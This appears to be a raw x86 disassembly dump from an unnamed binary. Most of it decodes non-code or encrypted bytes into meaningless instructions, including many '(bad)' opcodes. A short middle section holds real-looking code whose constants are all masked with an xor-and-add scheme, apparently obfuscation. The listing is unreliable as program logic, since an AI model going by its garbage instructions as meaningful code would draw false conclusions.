  405941:	out    0xff,al
  405943:	jl     0x4059ad
  405945:	cs inc esi
  405947:	stos   DWORD PTR es:[edi],eax
  405948:	adc    eax,ecx
  40594a:	fnstsw WORD PTR [ebx+0x70d9685]
  405950:	out    dx,al
  405951:	mov    edi,0x2e4c81b0
  405956:	pop    edi
  405957:	inc    esi
  405958:	cwde   
  405959:	pop    ebp
  40595a:	mov    esp,0x7dff1674
  40595f:	test   DWORD PTR [ecx-0x46],esp
  405962:	pop    edx
  405963:	mov    edi,DWORD PTR [ebp-0x36]
  405966:	inc    ebp
  405967:	sbb    dh,BYTE PTR [edi]
  405969:	lds    ebp,FWORD PTR [edx]
  40596b:	ss mov al,0xf1
  40596e:	lods   al,BYTE PTR ds:[esi]
  40596f:	into   
  405970:	mov    bl,0xc1
  405972:	xchg   ecx,eax
  405973:	push   0x91e22f2d
  405978:	shl    BYTE PTR [edi-0x71],0x83
  40597c:	addr16 in eax,dx
  40597e:	fwait
  40597f:	repnz lahf 
  405981:	pushf  
  405982:	cli    
  405983:	jge    0x4059c3
  405985:	(bad)  
  405987:	xchg   esi,eax
  405988:	mov    dh,0x36
  40598a:	pushf  
  40598b:	outs   dx,BYTE PTR ds:[esi]
  40598c:	adc    eax,0x2502636d
  405991:	addr16 test al,0x0
  405994:	add    eax,0xc9712638
  405999:	add    dh,BYTE PTR [ebx+eiz*4]
  40599c:	mov    edi,0x64be3094
  4059a1:	jl     0x405980
  4059a3:	clc    
  4059a4:	xor    eax,0x11d927ec
  4059a9:	mov    DWORD PTR [ebp+ebp*8+0x4c],ebp
  4059ad:	sbb    edx,eax
  4059af:	adc    al,0xb4
  4059b1:	sub    edx,eax
  4059b3:	call   0x8654:0xed812d46
  4059ba:	repz jno 0x405a35
  4059bd:	lods   eax,DWORD PTR ds:[esi]
  4059be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059bf:	iret   
  4059c0:	pandn  mm4,QWORD PTR [edi-0x5a5f5c60]
  4059c7:	ret    0x4d17
  4059ca:	sbb    al,0xe4
  4059cc:	popf   
  4059cd:	push   0xffffffb7
  4059cf:	sub    al,0xab
  4059d1:	ret    
  4059d2:	mov    dh,0xbc
  4059d4:	mov    edi,0x98ec6bac
  4059d9:	xlat   BYTE PTR ds:[ebx]
  4059da:	in     eax,0xc3
  4059dc:	xor    ecx,DWORD PTR [esp+edi*2]
  4059df:	add    BYTE PTR [ebx+0x2f],cl
  4059e2:	test   al,0x94
  4059e4:	data16 cld 
  4059e6:	xchg   ebx,ebx
  4059e8:	xor    DWORD PTR [esi-0x39],eax
  4059eb:	retf   
  4059ec:	imul   BYTE PTR [ebx-0x5cc4b2fa]
  4059f2:	into   
  4059f3:	mov    BYTE PTR [esi],dl
  4059f5:	mov    cl,0xf0
  4059f7:	pop    edi
  4059f8:	retf   
  4059f9:	mul    DWORD PTR [ebp+0x5a3a1f25]
  4059ff:	sub    bh,al
  405a01:	ds sar ebx,0x40
  405a05:	dec    ebx
  405a06:	loope  0x405a56
  405a08:	mov    al,0xe4
  405a0a:	out    dx,al
  405a0b:	xchg   ebp,eax
  405a0c:	or     al,0xa7
  405a0e:	add    al,0x87
  405a10:	ret    0xa8a3
  405a13:	sbb    DWORD PTR [edx],ecx
  405a15:	mov    esp,0x7d951915
  405a1a:	adc    bh,ch
  405a1c:	cdq    
  405a1d:	and    DWORD PTR [eax-0x60fe219b],0x59
  405a24:	pop    ebp
  405a25:	mov    ch,0x33
  405a27:	cmp    edx,DWORD PTR [ebx-0x70]
  405a2a:	sub    al,0xe7
  405a2c:	and    eax,0xfd3a7a4b
  405a31:	in     eax,dx
  405a32:	es push es
  405a34:	cmp    bl,0x76
  405a37:	int    0x3c
  405a39:	mov    ecx,0xeda6df39
  405a3e:	jo     0x405a49
  405a40:	lods   al,BYTE PTR ds:[esi]
  405a41:	leavew 
  405a43:	int3   
  405a44:	rcl    DWORD PTR [esi+0x43],cl
  405a47:	pusha  
  405a48:	not    DWORD PTR [eax-0xe]
  405a4b:	inc    ebp
  405a4c:	mov    eax,ds:0x97a078f2
  405a51:	cmp    ebx,DWORD PTR [eax-0x49b75b94]
  405a57:	mov    WORD PTR [eax-0x445fd20e],gs
  405a5d:	sub    eax,0xa2da6725
  405a62:	inc    eax
  405a63:	jbe    0x405a52
  405a65:	dec    ebp
  405a66:	jl     0x405a54
  405a68:	pop    esi
  405a69:	push   0x4cdd8509
  405a6e:	sub    DWORD PTR [ecx],ecx
  405a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a71:	push   ebx
  405a72:	dec    ebx
  405a73:	fist   DWORD PTR [edx+0x22cbe475]
  405a79:	inc    edx
  405a7a:	je     0x405a18
  405a7c:	fsub   DWORD PTR cs:[edi+0x13bf8cee]
  405a83:	call   0xbd0ffa8b
  405a88:	icebp  
  405a89:	cmp    eax,0x7d6d0101
  405a8e:	add    edi,DWORD PTR [ecx-0x4a]
  405a91:	ret    
  405a92:	xchg   esi,eax
  405a93:	shl    DWORD PTR [ebx+ebp*2-0x1],0x7d
  405a98:	xchg   ebx,eax
  405a99:	or     DWORD PTR [ebx+0x57],ecx
  405a9c:	test   DWORD PTR [edx+0x3ec4f866],edi
  405aa2:	xor    eax,DWORD PTR ds:0xd84af97c
  405aa8:	lods   al,BYTE PTR ds:[esi]
  405aa9:	cmp    BYTE PTR [eax],ch
  405aab:	jne    0x405b0e
  405aad:	push   edx
  405aae:	mov    ch,dl
  405ab0:	add    al,0xf2
  405ab2:	(bad)  
  405ab3:	push   0x15
  405ab5:	push   ss
  405ab6:	dec    edi
  405ab7:	push   0xa5923825
  405abc:	push   eax
  405abd:	jbe    0x405a52
  405abf:	rcr    dh,0xf9
  405ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac3:	mov    bh,0x1e
  405ac5:	lods   al,BYTE PTR ds:[esi]
  405ac6:	add    al,0xfb
  405ac8:	por    mm2,QWORD PTR [edx+0x40]
  405acc:	pop    eax
  405acd:	das    
  405ace:	and    al,BYTE PTR [ecx+0x22]
  405ad1:	push   esp
  405ad2:	repnz ror DWORD PTR [eax],0x67
  405ad6:	cmp    BYTE PTR [ebx+0x527f06c5],dh
  405adc:	dec    edx
  405add:	and    dh,BYTE PTR [ebx+0x75]
  405ae0:	mov    esp,0xae92082
  405ae5:	rcr    BYTE PTR [edi],0xa9
  405ae8:	sbb    BYTE PTR ds:0x368100ea,dh
  405aee:	xor    ah,ch
  405af0:	aas    
  405af1:	xchg   ebx,eax
  405af2:	or     BYTE PTR [esi-0x1c],dh
  405af5:	inc    esp
  405af6:	bound  esp,QWORD PTR [ebx-0x7135d076]
  405afc:	pop    ds
  405afd:	popf   
  405afe:	dec    edi
  405aff:	and    ch,BYTE PTR [edi-0x16367527]
  405b05:	repz aaa 
  405b07:	setl   BYTE PTR [esi+0xc5f71ad]
  405b0e:	sub    ch,dl
  405b10:	mov    ecx,0x72b57baa
  405b15:	xor    edx,edi
  405b17:	enter  0xf0f3,0xce
  405b1b:	ret    
  405b1c:	rol    BYTE PTR [edi-0x6],1
  405b1f:	shl    BYTE PTR [ebp+eax*1-0x4645faf3],0xba
  405b27:	scas   eax,DWORD PTR es:[edi]
  405b28:	sbb    DWORD PTR [esi],eax
  405b2a:	cld    
  405b2b:	in     eax,dx
  405b2c:	adc    DWORD PTR [ebp+0x54],esp
  405b2f:	or     edi,DWORD PTR [eax]
  405b31:	xlat   BYTE PTR ds:[ebx]
  405b32:	jno    0x405bad
  405b34:	cmp    ch,BYTE PTR [esi+0x2]
  405b37:	xchg   ecx,eax
  405b38:	mov    edi,0x3ea0f2f3
  405b3d:	cmp    BYTE PTR [ecx-0xcaacd49],0xdd
  405b44:	xor    al,BYTE PTR [eax]
  405b46:	out    dx,eax
  405b47:	test   DWORD PTR [esi+0x45674f93],0x94645f5f
  405b51:	imul   esi,DWORD PTR [edx],0x59
  405b54:	sahf   
  405b55:	pop    edi
  405b56:	inc    ebp
  405b57:	cmp    edx,ebx
  405b59:	sub    eax,edi
  405b5b:	adc    bl,BYTE PTR [edx+0x6]
  405b5e:	call   0x75ff2177
  405b63:	aas    
  405b64:	xchg   edi,eax
  405b65:	cld    
  405b66:	cmp    DWORD PTR [eax+ecx*8-0x80],esi
  405b6a:	out    dx,eax
  405b6b:	(bad)  
  405b6c:	es jge 0x405b35
  405b6f:	sahf   
  405b70:	mov    ebx,0x11a006bd
  405b75:	inc    ecx
  405b76:	adc    DWORD PTR ds:0x7d3f4359,esp
  405b7c:	movhps xmm2,QWORD PTR [eax+ebx*2]
  405b80:	fmul   DWORD PTR [esp+ecx*8+0x16]
  405b84:	dec    edi
  405b85:	mov    ds:0x54465087,al
  405b8a:	pop    ebx
  405b8b:	int    0x68
  405b8d:	mov    bh,BYTE PTR [ebx-0x6b44d051]
  405b93:	or     al,0xac
  405b95:	test   esi,ebp
  405b97:	pop    es
  405b98:	sbb    eax,ebx
  405b9a:	ja     0x405b45
  405b9c:	(bad)  
  405b9d:	arpl   WORD PTR [ecx+0x42],cx
  405ba0:	xchg   edi,eax
  405ba1:	lock pop es
  405ba3:	mov    bl,0x3b
  405ba5:	in     eax,0xe4
  405ba7:	cdq    
  405ba8:	cli    
  405ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405baa:	and    eax,DWORD PTR [ecx]
  405bac:	addr16 sbb al,0x80
  405baf:	inc    esi
  405bb0:	iret   
  405bb1:	and    BYTE PTR [ebx],dl
  405bb3:	sub    edx,DWORD PTR [ebx-0x19]
  405bb6:	jp     0x405b71
  405bb8:	mov    BYTE PTR [eax],bh
  405bba:	cwde   
  405bbb:	in     eax,dx
  405bbc:	add    eax,0x23bd81c0
  405bc1:	xchg   esi,eax
  405bc2:	cmc    
  405bc3:	clc    
  405bc4:	psrlq  mm2,QWORD PTR [esi]
  405bc7:	cmp    DWORD PTR [edx-0x109f2cc7],ebp
  405bcd:	sar    BYTE PTR [ecx],1
  405bcf:	lds    ebp,FWORD PTR [ebp+0x2c319695]
  405bd5:	lock push es
  405bd7:	xchg   BYTE PTR [esi],dh
  405bd9:	inc    ebx
  405bda:	scas   al,BYTE PTR es:[edi]
  405bdb:	imul   edx,DWORD PTR [ecx],0x19
  405bde:	mov    ebp,0xce4b4ffe
  405be3:	mov    al,0x57
  405be5:	(bad)  
  405be6:	shr    dl,1
  405be8:	adc    al,dl
  405bea:	popa   
  405beb:	xchg   ecx,eax
  405bec:	sbb    bh,BYTE PTR [eax]
  405bee:	mov    edx,0x6bd75b23
  405bf3:	mov    dh,0xb
  405bf5:	and    BYTE PTR [esi],ah
  405bf7:	jbe    0x405b79
  405bf9:	ds cmp al,0xec
  405bfc:	pop    ds
  405bfd:	or     dl,ch
  405bff:	push   esi
  405c00:	pop    edi
  405c01:	arpl   WORD PTR [ecx+0x6355d603],di
  405c07:	ss (bad) 
  405c09:	xchg   esp,eax
  405c0a:	xor    dl,0x3b
  405c0d:	(bad)  [edx+esi*8+0x28]
  405c11:	clc    
  405c12:	add    eax,0x2329ece2
  405c17:	cli    
  405c18:	adc    eax,0x1774c9a7
  405c1d:	aaa    
  405c1e:	retf   
  405c1f:	clc    
  405c20:	xlat   BYTE PTR ds:[ebx]
  405c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c22:	scas   eax,DWORD PTR es:[edi]
  405c23:	loope  0x405c7a
  405c25:	pop    eax
  405c26:	lods   al,BYTE PTR ds:[esi]
  405c27:	cmp    DWORD PTR ds:0xa6a33142,ecx
  405c2d:	aaa    
  405c2e:	mov    eax,ds:0x9a1b1645
  405c33:	(bad)  
  405c34:	hlt    
  405c35:	jmp    0xe6adce69
  405c3a:	mov    ds:0x8d172a00,al
  405c3f:	ficom  DWORD PTR [ecx-0x589bf15f]
  405c45:	or     edx,esi
  405c47:	push   ss
  405c48:	dec    ebp
  405c49:	cmp    al,0xc3
  405c4b:	sahf   
  405c4c:	sub    ch,bh
  405c4e:	adc    eax,0x5b57f4f7
  405c53:	sub    DWORD PTR es:[edx-0x7f],ecx
  405c57:	push   ebp
  405c58:	jb     0x405c66
  405c5a:	sub    DWORD PTR [ecx-0x7c],esi
  405c5d:	xchg   ebx,eax
  405c5e:	cmp    al,0xb2
  405c60:	mov    ebx,0x248fd871
  405c65:	stos   DWORD PTR es:[edi],eax
  405c66:	or     edx,DWORD PTR [ecx+0x20]
  405c69:	es cmp eax,0x4dc2e806
  405c6f:	call   0x5f6b:0x12c1a339
  405c76:	add    DWORD PTR [esi-0x6df5b391],0xfe2f5b2e
  405c80:	adc    al,0xf5
  405c82:	jl     0x405c5c
  405c84:	in     al,dx
  405c85:	loope  0x405cd8
  405c87:	add    al,0x40
  405c89:	dec    esi
  405c8a:	jo     0x405c49
  405c8c:	ds dec esi
  405c8e:	mov    cl,BYTE PTR [esi-0x14]
  405c91:	mov    BYTE PTR [ebx+eax*8],al
  405c94:	js     0x405c2a
  405c96:	ret    
  405c97:	popa   
  405c98:	pop    ecx
  405c99:	in     al,dx
  405c9a:	jecxz  0x405c92
  405c9c:	push   di
  405c9e:	xlat   BYTE PTR ds:[ebx]
  405c9f:	sub    DWORD PTR [eax],esi
  405ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ca2:	std    
  405ca3:	jle    0x405c4f
  405ca5:	dec    ebp
  405ca6:	fsub   DWORD PTR [edi]
  405ca8:	mov    ch,0x85
  405caa:	xlat   BYTE PTR ds:[ebx]
  405cab:	(bad)  
  405cac:	or     al,0xcf
  405cae:	jns    0x405c82
  405cb0:	ins    BYTE PTR es:[edi],dx
  405cb1:	pop    eax
  405cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cb3:	pop    es
  405cb4:	pop    ebx
  405cb5:	push   ebx
  405cb6:	xor    ebp,DWORD PTR [edx]
  405cb8:	jae    0x405cda
  405cba:	inc    ecx
  405cbb:	xchg   BYTE PTR [edx-0x38],dl
  405cbe:	adc    DWORD PTR [ebx-0x36e3d693],ebx
  405cc4:	or     ecx,DWORD PTR [ecx]
  405cc6:	dec    ebp
  405cc7:	and    al,0x64
  405cc9:	or     BYTE PTR [ebp-0x27],bl
  405ccc:	out    dx,al
  405ccd:	xchg   esp,eax
  405cce:	xchg   ebp,eax
  405ccf:	mov    cl,0x90
  405cd1:	test   BYTE PTR [eax],bh
  405cd3:	inc    edi
  405cd4:	adc    esi,DWORD PTR [ecx]
  405cd6:	into   
  405cd7:	mov    ch,0x11
  405cd9:	ins    DWORD PTR es:[edi],dx
  405cda:	retf   
  405cdb:	cmc    
  405cdc:	imul   ebp,DWORD PTR [ecx-0x25],0x2c5a9925
  405ce3:	jbe    0x405c71
  405ce5:	in     al,dx
  405ce6:	or     ah,BYTE PTR [edi-0x52]
  405ce9:	loopne 0x405cf0
  405ceb:	nop
  405cec:	jnp    0x405d56
  405cee:	adc    ax,0x8a85
  405cf2:	mov    ebx,0xbe77dbab
  405cf7:	mov    ah,0x2b
  405cf9:	dec    esp
  405cfa:	test   eax,0xce700435
  405cff:	ja     0x405c90
  405d01:	add    eax,0xa246f6ab
  405d06:	ret    
  405d07:	test   al,0x17
  405d09:	mov    ds:0xc445f121,eax
  405d0e:	pop    edx
  405d0f:	cwde   
  405d10:	adc    dl,BYTE PTR [eax]
  405d12:	mov    ah,0x48
  405d14:	sub    al,BYTE PTR [esi-0x5a9f1bb3]
  405d1a:	test   al,0xa1
  405d1c:	and    DWORD PTR [ebx-0x59],0x40
  405d20:	jmp    0x405cfb
  405d22:	fistp  WORD PTR ds:0xb133a783
  405d28:	fxch   st(7)
  405d2a:	(bad)  
  405d2b:	sbb    DWORD PTR [eax+0x2d],ebx
  405d2e:	shrd   DWORD PTR [ebp+0x17c76963],ebx,cl
  405d35:	test   DWORD PTR [ebx-0x1409cd63],0xf7d035f1
  405d3f:	push   ebp
  405d40:	and    al,0xf5
  405d42:	clc    
  405d43:	outs   dx,BYTE PTR ds:[esi]
  405d44:	inc    eax
  405d45:	ret    0x15ba
  405d48:	jne    0x405d51
  405d4a:	aam    0xff
  405d4c:	inc    edi
  405d4d:	xchg   edi,eax
  405d4e:	scas   eax,DWORD PTR es:[edi]
  405d4f:	pop    ebp
  405d50:	fisttp WORD PTR [edi-0x27c5707d]
  405d56:	rcl    DWORD PTR [eax+ebx*1-0x9],0xee
  405d5b:	pop    es
  405d5c:	and    eax,0xb372b0aa
  405d61:	ret    0xf28f
  405d64:	jmp    0x26a9fb04
  405d69:	jne    0x405d81
  405d6b:	adc    ah,BYTE PTR [esi+edx*8]
  405d6e:	mov    WORD PTR ds:0xcd576d9e,fs
  405d74:	(bad)  
  405d75:	mov    ds:0xef6ed64f,al
  405d7a:	sub    eax,edi
  405d7c:	dec    ecx
  405d7d:	dec    eax
  405d7e:	in     eax,dx
  405d7f:	inc    eax
  405d80:	or     al,0xe5
  405d82:	(bad)  
  405d83:	sar    BYTE PTR [ecx-0xf735100],cl
  405d89:	jo     0x405d13
  405d8b:	dec    edi
  405d8c:	pop    eax
  405d8d:	sbb    ebx,esp
  405d8f:	or     DWORD PTR [edx-0x57],0xa3d8d1f0
  405d96:	bound  eax,QWORD PTR [ebp+ebx*2+0x3ce21a65]
  405d9d:	xchg   esi,eax
  405d9e:	scas   eax,DWORD PTR es:[edi]
  405d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405da0:	push   ecx
  405da1:	sbb    esp,DWORD PTR [ebp*1-0x36665e91]
  405da8:	add    BYTE PTR [ecx-0x32],cl
  405dab:	mov    eax,DWORD PTR [edi-0x5d331bc7]
  405db1:	sahf   
  405db2:	xchg   edx,eax
  405db3:	cmp    al,BYTE PTR [edi-0x6473fa18]
  405db9:	es ret 0x631
  405dbd:	pop    ebx
  405dbe:	leave  
  405dbf:	jne    0x405d5a
  405dc1:	or     eax,DWORD PTR [edx-0x4d]
  405dc4:	retf   
  405dc5:	sbb    al,0x39
  405dc7:	push   0xfffffff1
  405dc9:	retf   0xb261
  405dcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dcd:	and    al,0xbe
  405dcf:	inc    esp
  405dd0:	pushf  
  405dd1:	add    eax,0xf3084fe7
  405dd6:	jg     0x405da3
  405dd8:	leave  
  405dd9:	cmp    al,0x63
  405ddb:	in     al,0x26
  405ddd:	push   ebx
  405dde:	ds (bad) 
  405de0:	dec    edx
  405de1:	test   ch,bl
  405de3:	pushf  
  405de4:	in     eax,0x91
  405de6:	inc    esi
  405de7:	push   ebp
  405de8:	mov    esi,esi
  405dea:	pop    ebp
  405deb:	or     al,0x56
  405ded:	sbb    BYTE PTR [ebx-0x4e],cl
  405df0:	jmp    0x405de2
  405df2:	loope  0x405da1
  405df4:	test   BYTE PTR [edi-0x6a],cl
  405df7:	or     ebp,DWORD PTR [esi+0x5436604d]
  405dfd:	xchg   edi,eax
  405dfe:	mov    bl,0x8c
  405e00:	pushf  
  405e01:	sbb    bh,BYTE PTR [ebx+0x28]
  405e04:	adc    DWORD PTR [eax+0x1530fcea],edi
  405e0a:	dec    edi
  405e0b:	(bad)  
  405e0c:	inc    esi
  405e0d:	ficomp WORD PTR [ebx-0x5b19fb25]
  405e13:	pushf  
  405e14:	pop    esp
  405e15:	mov    es,WORD PTR [edx-0x14ed1895]
  405e1b:	sub    DWORD PTR [esi],edx
  405e1d:	jg     0x405e5e
  405e1f:	loopne 0x405e3f
  405e21:	sbb    BYTE PTR [ebx-0x43881428],0x20
  405e28:	pop    ecx
  405e29:	lds    edi,FWORD PTR [esi]
  405e2b:	fnstsw WORD PTR [edx-0x8]
  405e2e:	not    DWORD PTR [edi-0x1e]
  405e31:	lea    ebx,[esi+0x47]
  405e34:	push   ebx
  405e35:	pop    ss
  405e36:	nop
  405e37:	xor    eax,ebx
  405e39:	mov    cl,BYTE PTR [esi-0x2b]
  405e3c:	xor    ebx,edi
  405e3e:	fsub   DWORD PTR [edx-0x4a6b5bbb]
  405e44:	adc    edi,DWORD PTR [esi+0x15]
  405e47:	jg     0x405e80
  405e49:	sahf   
  405e4a:	stc    
  405e4b:	push   es
  405e4c:	pop    ds
  405e4d:	push   ds
  405e4e:	push   edi
  405e4f:	fcomp  QWORD PTR [esi-0x5e068a76]
  405e55:	sbb    esp,DWORD PTR [eax-0x625d5143]
  405e5b:	test   ebp,ebp
  405e5d:	in     eax,0xaf
  405e5f:	std    
  405e60:	adc    DWORD PTR [ebx],0x40
  405e63:	icebp  
  405e64:	cld    
  405e65:	dec    ebp
  405e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e67:	out    0xc0,al
  405e69:	sub    al,0xdc
  405e6b:	mov    ah,0x84
  405e6d:	xchg   edi,eax
  405e6e:	fild   DWORD PTR ds:0x875d8a74
  405e74:	sub    edx,DWORD PTR [ecx]
  405e76:	and    edx,ebp
  405e78:	lock sub ah,BYTE PTR [edx+0x5753e746]
  405e7f:	or     esp,DWORD PTR [edi+0x6dc90fbc]
  405e85:	push   eax
  405e86:	xchg   ecx,eax
  405e87:	arpl   WORD PTR [ecx+0x7d0568d1],ax
  405e8d:	cs and al,0x3d
  405e90:	cmc    
  405e91:	cmp    dl,BYTE PTR [ebp+eiz*8-0x48c35aa8]
  405e98:	imul   ecx,DWORD PTR [eax],0xfa94df6
  405e9e:	or     BYTE PTR [edx-0x4003ab2],0xf0
  405ea5:	mov    eax,0x19d579a9
  405eaa:	imul   ebp,DWORD PTR [edx+0x6e4f29ca],0xffffffc6
  405eb1:	mov    esp,DWORD PTR [edi-0x1f]
  405eb4:	jl     0x405e76
  405eb6:	jo     0x405f29
  405eb8:	clc    
  405eb9:	push   ecx
  405eba:	icebp  
  405ebb:	shl    DWORD PTR [esi+0x20],0x3b
  405ebf:	mov    bh,0xdd
  405ec1:	out    0x5d,eax
  405ec3:	dec    esi
  405ec4:	imul   DWORD PTR [esi+ebp*8+0xa7df91e]
  405ecb:	push   ebx
  405ecc:	dec    esi
  405ecd:	sahf   
  405ece:	mov    esi,0xac18c672
  405ed3:	jp     0x405ee3
  405ed5:	mov    BYTE PTR [eax+ebx*1],bh
  405ed8:	jno    0x405ed1
  405eda:	lea    ebx,[ecx+0x59]
  405edd:	sbb    BYTE PTR [ecx-0x51],ch
  405ee0:	repnz loope 0x405f06
  405ee3:	and    DWORD PTR [ebx+0xd],esp
  405ee6:	mov    ah,0xbc
  405ee8:	das    
  405ee9:	mov    esi,0xd8a1e544
  405eee:	fcomp  st(4)
  405ef0:	inc    ecx
  405ef1:	call   0x9c49:0x58c69b63
  405ef8:	arpl   WORD PTR [edx],di
  405efa:	in     al,dx
  405efb:	lods   al,BYTE PTR ds:[esi]
  405efc:	popf   
  405efd:	ror    DWORD PTR [esi+eiz*8],0x52
  405f01:	and    DWORD PTR ds:0x327fcb47,ecx
  405f07:	sub    edx,DWORD PTR [ecx-0x1c]
  405f0a:	mov    edx,0x9f148c89
  405f0f:	rcl    DWORD PTR [esi],1
  405f11:	jmp    0xa8cc:0xbf2044d8
  405f18:	(bad)  
  405f19:	loop   0x405eb9
  405f1b:	pop    esi
  405f1c:	dec    ebx
  405f1d:	adc    DWORD PTR ss:[ebp+0x30],0xcc9ef66d
  405f25:	dec    edx
  405f26:	btr    DWORD PTR [ebx+edx*4-0x39],edi
  405f2b:	inc    ebp
  405f2c:	int3   
  405f2d:	or     DWORD PTR [eax],eax
  405f2f:	add    BYTE PTR [eax],al
  405f31:	mov    ecx,DWORD PTR [ebp+0x8]
  405f34:	xor    ecx,esi
  405f36:	add    ecx,edi
  405f38:	jmp    0x40a8de
  405f3d:	lea    eax,[ecx+ebx*1]
  405f40:	mov    DWORD PTR [ebp-0x2c],eax
  405f43:	mov    eax,DWORD PTR [ebp-0x58]
  405f46:	sub    eax,ecx
  405f48:	mov    DWORD PTR [ebp-0x1c],eax
  405f4b:	mov    eax,DWORD PTR [ebp-0x1c]
  405f4e:	mov    DWORD PTR [ebp-0x14],eax
  405f51:	mov    eax,DWORD PTR [ebp-0x2c]
  405f54:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  405f5b:	mov    DWORD PTR [ebp-0x54],eax
  405f5e:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  405f65:	mov    eax,DWORD PTR [ebp-0x38]
  405f68:	xor    eax,esi
  405f6a:	add    eax,edi
  405f6c:	mov    DWORD PTR [ebp-0x10],eax
  405f6f:	mov    eax,DWORD PTR [ebp-0x38]
  405f72:	xor    eax,esi
  405f74:	add    eax,edi
  405f76:	mov    DWORD PTR [ebp-0x8],eax
  405f79:	mov    DWORD PTR [ebp-0x2c],0xf89c8599
  405f80:	mov    DWORD PTR [ebp-0x44],0xf89c85b0
  405f87:	mov    eax,DWORD PTR [ebp-0x38]
  405f8a:	mov    edx,DWORD PTR [ebp-0x14]
  405f8d:	xor    eax,esi
  405f8f:	add    eax,edi
  405f91:	cmp    edx,eax
  405f93:	je     0x40a8d2
  405f99:	mov    eax,DWORD PTR [ebp-0x20]
  405f9c:	xor    eax,esi
  405f9e:	mov    edx,0xffcd8d11
  405fa3:	sub    edx,eax
  405fa5:	add    edx,DWORD PTR [ebp-0x14]
  405fa8:	mov    eax,DWORD PTR [ebp-0x20]
  405fab:	mov    ebx,DWORD PTR [ebp-0x10]
  405fae:	xor    eax,esi
  405fb0:	add    eax,edi
  405fb2:	imul   eax,ebx
  405fb5:	cmp    eax,edx
  405fb7:	ja     0x40a8cf
  405fbd:	mov    edx,DWORD PTR [ebp-0x10]
  405fc0:	mov    eax,DWORD PTR [ebp-0x14]
  405fc3:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fc6:	sub    eax,edx
  405fc8:	xor    ebx,esi
  405fca:	xor    edx,edx
  405fcc:	add    ebx,edi
  405fce:	div    ebx
  405fd0:	mov    DWORD PTR [ebp-0x8],eax
  405fd3:	mov    eax,DWORD PTR [ebp-0x44]
  405fd6:	mov    edx,DWORD PTR [ebp-0x8]
  405fd9:	xor    eax,esi
  405fdb:	add    eax,edi
  405fdd:	cmp    edx,eax
  405fdf:	jbe    0x405fef
  405fe5:	mov    eax,DWORD PTR [ebp-0x44]
  405fe8:	xor    eax,esi
  405fea:	add    eax,edi
  405fec:	mov    DWORD PTR [ebp-0x8],eax
  405fef:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff2:	mov    edx,DWORD PTR [ebp-0x8]
  405ff5:	xor    eax,esi
  405ff7:	add    eax,edi
  405ff9:	imul   eax,edx
  405ffc:	mov    DWORD PTR [ebp-0x8],eax
  405fff:	mov    eax,DWORD PTR [ebp-0x38]
  406002:	mov    edx,DWORD PTR [ebp-0x8]
  406005:	xor    eax,esi
  406007:	add    eax,edi
  406009:	cmp    edx,eax
  40600b:	je     0x40a8b8
  406011:	mov    eax,DWORD PTR [ebp-0x8]
  406014:	mov    DWORD PTR [ebp-0x18],eax
  406017:	mov    eax,DWORD PTR [ebp-0x10]
  40601a:	add    eax,DWORD PTR [ebp-0x54]
  40601d:	mov    DWORD PTR [ebp-0x1c],0xf89c85b9
  406024:	mov    DWORD PTR [ebp-0x8],eax
  406027:	mov    eax,0xf89c85ba
  40602c:	mov    DWORD PTR [ebp-0x28],eax
  40602f:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  406036:	mov    DWORD PTR [ebp-0x40],0xf89c85bc
  40603d:	mov    DWORD PTR [ebp-0x30],eax
  406040:	mov    eax,DWORD PTR [ebp-0x1c]
  406043:	xor    eax,esi
  406045:	add    eax,edi
  406047:	jmp    0x40a874
  40604c:	mov    DWORD PTR [ebp-0x4c],0xf89c85b4
  406053:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  40605a:	mov    eax,DWORD PTR [ebp-0x30]
  40605d:	mov    edx,DWORD PTR [ebp-0xc]
  406060:	xor    eax,esi
  406062:	add    eax,edi
  406064:	imul   eax,edx
  406067:	jmp    0x40840a
  40606c:	pop    edx
  40606d:	add    BYTE PTR [eax-0x613b5f9c],ah
  406073:	add    al,0x73
  406075:	xor    eax,0x3d36eab1
  40607a:	shl    DWORD PTR ds:[esi+0x33],0x7a
  40607f:	jp     0x40607d
  406081:	pop    edi
  406082:	jp     0x4060fe
  406084:	std    
  406085:	jb     0x406093
  406087:	jae    0x4060e7
  406089:	jecxz  0x406017
  40608b:	adc    DWORD PTR ss:[ecx+0x4b6505b],edx
  406092:	mov    edi,0x9bb94fae
  406097:	xchg   BYTE PTR [eax+0x58],dl
  40609a:	in     al,dx
  40609b:	jle    0x40606b
  40609d:	fidiv  DWORD PTR [ebx+0x1b8346ab]
  4060a3:	ins    BYTE PTR es:[edi],dx
  4060a4:	push   0x45
  4060a6:	ret    0x41a8
  4060a9:	mov    cl,0x2f
  4060ab:	loop   0x406090
  4060ad:	aaa    
  4060ae:	jecxz  0x4060f2
  4060b0:	cmp    eax,0xd6a095f4
  4060b5:	jo     0x40611b
  4060b7:	leave  
  4060b8:	ins    DWORD PTR es:[edi],dx
  4060b9:	mov    esp,0xd7497a8f
  4060be:	icebp  
  4060bf:	stos   BYTE PTR es:[edi],al
  4060c0:	inc    ebp
  4060c1:	cwde   
  4060c2:	or     ebx,0x96d60810
  4060c8:	add    al,0x8
  4060ca:	mov    eax,eax
  4060cc:	dec    esi
  4060cd:	dec    edx
  4060ce:	push   es
  4060cf:	mov    ds:0xd7aefca9,al
  4060d4:	mov    esi,0x4089a4ed
  4060d9:	(bad)  
  4060da:	fistp  DWORD PTR [ebx*2-0x53cbcf1b]
  4060e1:	dec    eax
  4060e2:	cli    
  4060e3:	or     dl,dh
  4060e5:	adc    eax,0x293ded20
  4060ea:	sub    al,bh
  4060ec:	sub    BYTE PTR [eax+0x32b8e5a0],cl
  4060f2:	cs jg  0x406075
